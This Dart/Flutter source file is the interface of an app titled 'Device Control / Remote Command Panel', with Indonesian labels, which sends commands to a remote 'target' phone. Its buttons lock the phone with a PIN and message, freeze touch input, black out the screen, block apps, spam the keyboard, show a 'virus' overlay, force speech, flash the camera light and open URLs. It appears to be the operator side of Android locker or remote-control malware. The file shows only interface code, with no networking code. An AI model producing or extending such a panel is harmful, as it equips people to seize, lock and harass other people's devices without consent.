        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(m.text,
              style: TextStyle(
                  fontSize: 14,
                  color: isMine ? Colors.black : Colors.white)),
          const SizedBox(height: 4),
          Text(timeStr,
              style: TextStyle(
                  fontSize: 10,
                  color: isMine
                      ? Colors.black.withOpacity(0.6)
                      : _C.muted)),
        ],
      ),
    ),
  );
}
  // ═════════════════════════════════════════════════════════════════════════
  // BUILD
  // ═════════════════════════════════════════════════════════════════════════
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: _bgVideo(
        child: SafeArea(
          child: Column(
            children: [
              _buildTopBar(),
              Expanded(
                child: _isLoading
                    ? const Center(
                        child: CircularProgressIndicator(
                            color: _C.red, strokeWidth: 2))
                    : ListView(
                        padding:
                            const EdgeInsets.fromLTRB(20, 14, 20, 40),
                        physics: const BouncingScrollPhysics(),
                        children: [
                          _buildDeviceHero(),
                          const SizedBox(height: 22),
                          _buildSection('Kunci Layar', [
                            _actionCard('lock', 'LOCK',
                                'Kunci device dengan PIN + pesan',
                                Icons.lock_rounded),
                            _actionCard('unlock', 'UNLOCK',
                                'Buka kunci device',
                                Icons.lock_open_rounded),
                            _actionCard('custom_lock', 'CUSTOM LOCK',
                                'Kunci otomatis dalam durasi tertentu',
                                Icons.timer_rounded),
                            _actionCard('custom_lock_html', 'HTML LOCK',
                                'Custom tampilan HTML lock screen',
                                Icons.code_rounded),
                          ]),
                          _buildSection('Layar LCD', [
                            _actionCard('lcd_on', 'LCD ON',
                                'Muncul 4 garis hijau + overlay',
                                Icons.monitor_rounded),
                            _actionCard('lcd_off', 'LCD OFF',
                                'Matikan efek LCD',
                                Icons.monitor_rounded),
                          ]),
                          _buildSection('Chat Lock', [
                            _actionCard('chat_lock_on', 'CHAT LOCK ON',
                                'Kunci device dengan dialog chat',
                                Icons.chat_bubble_rounded),
                            _actionCard('chat_lock_off', 'CHAT LOCK OFF',
                                'Hentikan chat lock di target',
                                Icons.chat_bubble_outline_rounded),
                          ]),
                          _buildSection('Block App', [
                            _actionCard('block_app', 'BLOCK APP',
                                'Masukkan package name app target',
                                Icons.block_rounded),
                            _actionCard('unblock_all', 'UNBLOCK ALL',
                                'Hapus semua app yang diblok',
                                Icons.check_circle_rounded),
                          ]),
                          _buildSection('Suara Target (TTS)', [
                            _actionCard('tts', 'TEXT TO SPEECH',
                                'Target bakal ngomong teks yang kamu ketik',
                                Icons.record_voice_over_rounded),
                          ]),
                          _buildSection('Overlay', [
                            _actionCard('freeze_on', 'FREEZE ON',
                                'Bekukan sentuhan di layar target',
                                Icons.pause_circle_rounded),
                            _actionCard('freeze_off', 'FREEZE OFF',
                                'Matikan freeze',
                                Icons.play_circle_rounded),
                            _actionCard('blank_on', 'BLANK ON',
                                'Layar jadi hitam total',
                                Icons.dark_mode_rounded),
                            _actionCard('blank_off', 'BLANK OFF',
                                'Matikan overlay hitam',
                                Icons.light_mode_rounded),
                            _actionCard('ambacong_on', 'AMBACONG ON',
                                'Tampilkan gambar lucu bergantian',
                                Icons.image_rounded),
                            _actionCard('ambacong_off', 'AMBACONG OFF',
                                'Matikan overlay ambacong',
                                Icons.image_not_supported_rounded),
                            _actionCard('virus_amba_on', 'VIRUS AMBA ON',
                                'Gambar virus makin banyak + sound',
                                Icons.coronavirus_rounded),
                            _actionCard('virus_amba_off', 'VIRUS AMBA OFF',
                                'Hentikan virus + sound',
                                Icons.healing_rounded),
                            _actionCard('keyboard_on', 'KEYBOARD ON',
                                'Spam keyboard muncul terus',
                                Icons.keyboard_rounded),
                            _actionCard('keyboard_off', 'KEYBOARD OFF',
                                'Hentikan keyboard spam',
                                Icons.keyboard_hide_rounded),
                            _actionCard('video_on', 'VIDEO ON',
                                'Putar video fullscreen di target',
                                Icons.play_circle_fill_rounded),
                            _actionCard('video_off', 'VIDEO OFF',
                                'Hentikan video lock',
                                Icons.stop_circle_rounded),
                          ]),
                          _buildSection('Flash Kamera', [
                            _actionCard('flash_on', 'FLASH ON',
                                'Nyalakan flash kamera target',
                                Icons.flash_on_rounded),
                            _actionCard('flash_off', 'FLASH OFF',
                                'Matikan flash kamera',
                                Icons.flash_off_rounded),
                            _actionCard('flash_blink', 'FLASH BLINK',
                                'Flash kedip-kedip terus',
                                Icons.flash_auto_rounded),
                          ]),
                          _buildSection('Audio & Media', [
                            _actionCard('play_sound', 'PLAY SOUND',
                                'Putar audio dari URL di target',
                                Icons.volume_up_rounded),
                            _actionCard('stop_sound', 'STOP SOUND',
                                'Hentikan audio yang diputar',
                                Icons.volume_off_rounded),
                            _actionCard('wallpaper', 'SET WALLPAPER',
                                'Ganti wallpaper device target',
                                Icons.wallpaper_rounded),
                          ]),
                          _buildSection('Prank & Lainnya', [
                            _actionCard('prank_call', 'PRANK CALL',
                                'Simulasi panggilan masuk',
                                Icons.phone_rounded),
                            _actionCard('open_url', 'BUKA URL',
                                'Buka website di browser target',
                                Icons.link_rounded),
                            _actionCard('vibrate', 'VIBRATE',
                                'Getarkan HP target',
                                Icons.vibration_rounded),
                          ]),
                          const SizedBox(height: 22),
                          _buildDangerZone(),
                          const SizedBox(height: 22),
                          _buildLogList(),
                        ],
                      ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ═══ BG VIDEO ═══
  Widget _bgVideo({required Widget child}) {
    final c = _vCtrl;
    final ready = _videoReady && c != null && c.value.isInitialized;
    return Stack(
      fit: StackFit.expand,
      children: [
        Container(color: Colors.black),
        if (!ready)
          Container(
            decoration: const BoxDecoration(
              gradient: LinearGradient(
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
                colors: [
                  Color(0xFF0A0A0A),
                  Color(0xFF141414),
                  Color(0xFF000000),
                ],
              ),
            ),
          ),
        if (ready)
          Positioned.fill(
            child: RepaintBoundary(
              child: ClipRect(
                child: _CoverVideo(key: _videoKey, controller: c),
              ),
            ),
          ),
        Container(color: Colors.black.withOpacity(0.72)),
        child,
      ],
    );
  }

  // ═══ TOP BAR ═══
  Widget _buildTopBar() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(20, 14, 20, 6),
      child: Row(
        children: [
          GestureDetector(
            onTap: () => Navigator.pop(context),
            child: Container(
              width: 48,
              height: 48,
              decoration: BoxDecoration(
                color: Colors.white.withOpacity(0.06),
                borderRadius: BorderRadius.circular(14),
                border:
                    Border.all(color: Colors.white.withOpacity(0.12)),
              ),
              child: const Icon(Icons.arrow_back_rounded,
                  color: Colors.white, size: 24),
            ),
          ),
          const SizedBox(width: 14),
          const Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text('DEVICE CONTROL',
                    style: TextStyle(
                        fontSize: 18,
                        fontWeight: FontWeight.w900,
                        color: Colors.white,
                        letterSpacing: 1.5)),
                SizedBox(height: 2),
                Text('REMOTE COMMAND PANEL',
                    style: TextStyle(
                        fontSize: 10,
                        color: _C.muted,
                        letterSpacing: 1.5)),
              ],
            ),
          ),
          GestureDetector(
            onTap: () {
              _refreshDevice();
              _showSnack('Refresh');
            },
            child: Container(
              width: 48,
              height: 48,
              decoration: BoxDecoration(
                color: _C.red.withOpacity(0.12),
                borderRadius: BorderRadius.circular(14),
                border: Border.all(color: _C.red),
              ),
              child: const Icon(Icons.refresh_rounded,
                  color: _C.red, size: 24),
            ),
          ),
        ],
      ),
    );
  }

  // ═══ DEVICE HERO ═══
  Widget _buildDeviceHero() {
    final d = _device;
    if (d == null) {
      return _GlassCard(
        padding: const EdgeInsets.all(22),
        child: const Text('DEVICE TIDAK DITEMUKAN',
            style: TextStyle(
                fontSize: 16,
                fontWeight: FontWeight.w900,
                color: _C.red)),
      );
    }
    return _GlassCard(
      padding: const EdgeInsets.all(18),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          Row(
            children: [
              Container(
                width: 56,
                height: 56,
                decoration: BoxDecoration(
                  color: d.online
                      ? _C.red.withOpacity(0.15)
                      : Colors.white.withOpacity(0.05),
                  borderRadius: BorderRadius.circular(14),
                  border: Border.all(
                      color: d.online ? _C.red : _C.muted, width: 1.5),
                ),
                child: Icon(Icons.phone_iphone_rounded,
                    color: d.online ? _C.red : _C.muted, size: 28),
              ),
              const SizedBox(width: 14),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(d.name,
                        maxLines: 1,
                        overflow: TextOverflow.ellipsis,
                        style: const TextStyle(
                            fontSize: 18,
                            fontWeight: FontWeight.w900,
                            color: Colors.white,
                            letterSpacing: 1)),
                    const SizedBox(height: 6),
                    Row(children: [
                      Container(
                        padding: const EdgeInsets.symmetric(
                            horizontal: 8, vertical: 3),
                        decoration: BoxDecoration(
                          color: d.online ? _C.red : _C.muted,
                          borderRadius: BorderRadius.circular(4),
                        ),
                        child: Text(
                            d.online ? 'ONLINE' : 'OFFLINE',
                            style: const TextStyle(
                                fontSize: 10,
                                fontWeight: FontWeight.w900,
                                color: Colors.black,
                                letterSpacing: 1)),
                      ),
                    ]),
                  ],
                ),
              ),
            ],
          ),
          const SizedBox(height: 16),
          Container(
              height: 1, color: Colors.white.withOpacity(0.08)),
          const SizedBox(height: 12),
          Row(
            children: [
              _heroStat('BATERAI',
                  d.battery != null ? '${d.battery}%' : '—'),
              const SizedBox(width: 8),
              _heroStat('NEGARA', d.country),
              const SizedBox(width: 8),
              _heroStat('TERAKHIR', _timeAgo(d.lastSeen)),
            ],
          ),
        ],
      ),
    );
  }

  Widget _heroStat(String k, String v) {
    return Expanded(
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 8),
        decoration: BoxDecoration(
          color: Colors.white.withOpacity(0.05),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: Colors.white.withOpacity(0.1)),
        ),
        child: Column(
          children: [
            Text(v,
                maxLines: 1,
                overflow: TextOverflow.ellipsis,
                style: const TextStyle(
                    fontSize: 16,
                    fontWeight: FontWeight.w900,
                    color: _C.red,
                    letterSpacing: 0.5)),
            const SizedBox(height: 4),
            Text(k,
                style: const TextStyle(
                    fontSize: 10,
                    fontWeight: FontWeight.w700,
                    color: _C.muted,
                    letterSpacing: 1)),
          ],
        ),
      ),
    );
  }

  // ═══ SECTION ═══
  Widget _buildSection(String title, List<Widget> children) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        Padding(
          padding: const EdgeInsets.only(top: 14, bottom: 10),
          child: Row(children: [
            const Text('//',
                style: TextStyle(
                    fontWeight: FontWeight.w900,
                    color: Colors.white,
                    fontSize: 14)),
            const SizedBox(width: 8),
            Text(title.toUpperCase(),
                style: const TextStyle(
                    fontSize: 13,
                    fontWeight: FontWeight.w900,
                    color: Colors.white,
                    letterSpacing: 1.5)),
            const SizedBox(width: 10),
            Expanded(
                child:
                    Container(height: 1, color: Colors.white.withOpacity(0.1))),
          ]),
        ),
        ...children,
      ],
    );
  }

  // ═══ ACTION CARD ═══
  Widget _actionCard(
      String act, String title, String subtitle, IconData icon) {
    final disabled = _device == null || !_device!.online;
    return GestureDetector(
      onTap: disabled ? null : () => _handleAction(act),
      child: Opacity(
        opacity: disabled ? 0.5 : 1.0,
        child: Container(
          margin: const EdgeInsets.only(bottom: 10),
          child: _GlassCard(
            padding: const EdgeInsets.all(14),
            child: Row(children: [
              Container(
                width: 46,
                height: 46,
                decoration: BoxDecoration(
                  color: _C.red.withOpacity(0.15),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: _C.red.withOpacity(0.6)),
                ),
                child: Icon(icon, color: _C.red, size: 22),
              ),
              const SizedBox(width: 14),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(title,
                        style: const TextStyle(
                            fontSize: 14,
                            fontWeight: FontWeight.w900,
                            color: Colors.white,
                            letterSpacing: 1)),
                    const SizedBox(height: 3),
                    Text(subtitle,
                        maxLines: 2,
                        overflow: TextOverflow.ellipsis,
                        style: const TextStyle(
                            fontSize: 11, color: _C.muted)),
                  ],
                ),
              ),
              const Icon(Icons.chevron_right_rounded,
                  color: _C.muted, size: 24),
            ]),
          ),
        ),
      ),
    );
  }

  // ═══ DANGER ZONE ═══
  Widget _buildDangerZone() {
    return _GlassCard(
      padding: const EdgeInsets.all(18),
      child: Row(children: [
        Container(
          padding: const EdgeInsets.all(12),
          decoration: BoxDecoration(
            color: _C.red.withOpacity(0.15),
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: _C.red),
          ),
          child: const Icon(Icons.warning_rounded,
              color: _C.red, size: 28),
        ),
        const SizedBox(width: 12),
        const Expanded(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text('EMERGENCY STOP',
                  style: TextStyle(
                      fontSize: 15,
                      fontWeight: FontWeight.w900,
                      color: Colors.white,
                      letterSpacing: 1)),
              SizedBox(height: 3),
              Text('Matikan semua overlay sekaligus',
                  style: TextStyle(fontSize: 11, color: _C.muted)),
            ],
          ),
        ),
        GestureDetector(
          onTap: _device?.online == true ? _triggerEmergencyStop : null,
          child: Container(
            padding:
                const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
            decoration: BoxDecoration(
              color: _C.red,
              borderRadius: BorderRadius.circular(10),
              boxShadow: [
                BoxShadow(
                    color: _C.red.withOpacity(0.4), blurRadius: 12)
              ],
            ),
            child: const Text('STOP',
                style: TextStyle(
                    fontSize: 14,
                    fontWeight: FontWeight.w900,
                    color: Colors.black,
                    letterSpacing: 1.5)),
          ),
        ),
      ]),
    );
  }

  Future<void> _triggerEmergencyStop() async {
    final ok = await _confirmDialog(
      title: 'EMERGENCY STOP?',
      message: 'Matikan semua overlay & sound aktif di device target.',
      confirmLabel: 'STOP ALL',
    );
    if (ok != true) return;
    _showSnack('EMERGENCY STOP...');
    final cmds = [
      'unlock', 'freeze_off', 'blank_off', 'ambacong_off', 'virus_amba_off',
      'keyboard_off', 'video_off', 'flash_off', 'stop_sound', 'prank_end',
      'chat_lock_off', 'unblock_all', 'tts_stop', 'lcd_off',
    ];
    for (final c in cmds) {
      await _sendCommand(c);
      await Future.delayed(const Duration(milliseconds: 120));
    }
    _stopChatPolling();
    _showSnack('STOP ALL OK', success: true);
  }

  // ═══ LOG LIST ═══
  Widget _buildLogList() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        Padding(
          padding: const EdgeInsets.only(top: 12, bottom: 10),
          child: Row(children: [
            const Icon(Icons.history_rounded,
                color: Colors.white, size: 16),
            const SizedBox(width: 8),
            const Text('LOG PERINTAH',
                style: TextStyle(
                    fontSize: 13,
                    fontWeight: FontWeight.w900,
                    color: Colors.white,
                    letterSpacing: 1.5)),
            const SizedBox(width: 10),
            Expanded(
                child:
                    Container(height: 1, color: Colors.white.withOpacity(0.1))),
          ]),
        ),
        if (_logs.isEmpty)
          _GlassCard(
            padding: const EdgeInsets.all(22),
            child: const Center(
                child: Text('BELUM ADA PERINTAH DIKIRIM',
                    style: TextStyle(
                        fontSize: 12,
                        fontWeight: FontWeight.w800,
                        color: _C.muted,
                        letterSpacing: 1))),
          )
        else
          ..._logs.map((l) {
            final t = DateTime.fromMillisecondsSinceEpoch(l.ts);
            final time =
                '${t.hour.toString().padLeft(2, '0')}:${t.minute.toString().padLeft(2, '0')}';
            return Container(
              margin: const EdgeInsets.only(bottom: 8),
              child: _GlassCard(
                padding:
                    const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                child: Row(children: [
                  Container(
                    width: 10,
                    height: 10,
                    decoration: BoxDecoration(
                      color: l.ok ? _C.text : _C.red,
                      shape: BoxShape.circle,
                    ),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Text(
                        '${l.action} ${l.ok ? "TERKIRIM" : "GAGAL"}',
                        style: TextStyle(
                            fontSize: 12,
                            fontWeight: FontWeight.w800,
                            color:
                                l.ok ? _C.text : _C.red,
                            letterSpacing: 0.5)),
                  ),
                  Text(time,
                      style: const TextStyle(
                          fontSize: 11, color: _C.muted)),
                ]),
              ),
            );
          }),
      ],
    );
  }

  Future<bool?> _confirmDialog({
    required String title,
    required String message,
    required String confirmLabel,
  }) {
    return showDialog<bool>(
      context: context,
      builder: (ctx) => Dialog(
        backgroundColor: Colors.transparent,
        child: _GlassCard(
          padding: const EdgeInsets.all(22),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              const Icon(Icons.warning_rounded, color: _C.red, size: 54),
              const SizedBox(height: 14),
              Text(title,
                  textAlign: TextAlign.center,
                  style: const TextStyle(
                      fontSize: 20,
                      fontWeight: FontWeight.w900,
                      color: Colors.white,
                      letterSpacing: 1.5)),
              const SizedBox(height: 8),
              Text(message,
                  textAlign: TextAlign.center,
                  style: const TextStyle(fontSize: 12, color: _C.muted)),
              const SizedBox(height: 20),
              Row(
                children: [
                  Expanded(
                    child: _SecondaryBtn(
                      label: 'BATAL',
                      onTap: () => Navigator.pop(ctx, false),
                    ),
                  ),
                  const SizedBox(width: 12),
                  Expanded(
                    child: _PrimaryBtn(
                      label: confirmLabel,
                      onTap: () => Navigator.pop(ctx, true),
                    ),
                  ),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// WIDGET PENDUKUNG
// ═══════════════════════════════════════════════════════════════════════════

class _GlassCard extends StatelessWidget {
  final Widget child;
  final EdgeInsetsGeometry padding;
  const _GlassCard({
    required this.child,
    this.padding = const EdgeInsets.all(20),
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(18),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.35),
            blurRadius: 18,
            offset: const Offset(0, 8),
          ),
        ],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(18),
        child: BackdropFilter(
          filter: ImageFilter.blur(sigmaX: 12, sigmaY: 12),
          child: Container(
            padding: padding,
            decoration: BoxDecoration(
              color: Colors.black.withOpacity(0.42),
              borderRadius: BorderRadius.circular(18),
              border: Border.all(
                  color: Colors.white.withOpacity(0.1), width: 1),
            ),
            child: child,
          ),
        ),
      ),
    );
  }
}

class _PrimaryBtn extends StatelessWidget {
  final String label;
  final VoidCallback onTap;
  const _PrimaryBtn({required this.label, required this.onTap});

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        width: double.infinity,
        padding: const EdgeInsets.symmetric(vertical: 14),
        decoration: BoxDecoration(
          color: _C.red,
          borderRadius: BorderRadius.circular(12),
        ),
        child: Center(
          child: Text(label,
              style: const TextStyle(
                  fontSize: 14,
                  fontWeight: FontWeight.w900,
                  color: Colors.black,
                  letterSpacing: 1.5)),
        ),
      ),
    );
  }
}

class _SecondaryBtn extends StatelessWidget {
  final String label;
  final VoidCallback onTap;
  const _SecondaryBtn({required this.label, required this.onTap});

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        width: double.infinity,
        padding: const EdgeInsets.symmetric(vertical: 14),
        decoration: BoxDecoration(
          color: Colors.white.withOpacity(0.06),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: Colors.white.withOpacity(0.15)),
        ),
        child: Center(
          child: Text(label,
              style: const TextStyle(
                  fontSize: 14,
                  fontWeight: FontWeight.w800,
                  color: Colors.white,
                  letterSpacing: 1.5)),
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// COVER VIDEO — full-cover, no black frame
// ═══════════════════════════════════════════════════════════════════════════
class _CoverVideo extends StatelessWidget {
  final VideoPlayerController controller;
  const _CoverVideo({super.key, required this.controller});

  @override
  Widget build(BuildContext context) {
    final size = controller.value.size;
    if (size.width == 0 || size.height == 0) {
      return const SizedBox.shrink();
    }
    return LayoutBuilder(
      builder: (context, constraints) {
        final screenW = constraints.maxWidth;
        final screenH = constraints.maxHeight;
        final scale = (screenW / size.width) > (screenH / size.height)
            ? (screenW / size.width)
            : (screenH / size.height);
        final w = size.width * scale;
        final h = size.height * scale;
        return OverflowBox(
          maxWidth: w,
          maxHeight: h,
          minWidth: w,
          minHeight: h,
          alignment: Alignment.center,
          child: SizedBox(
            width: w,
            height: h,
            child: VideoPlayer(controller),
          ),
        );
      },
    );
  }
}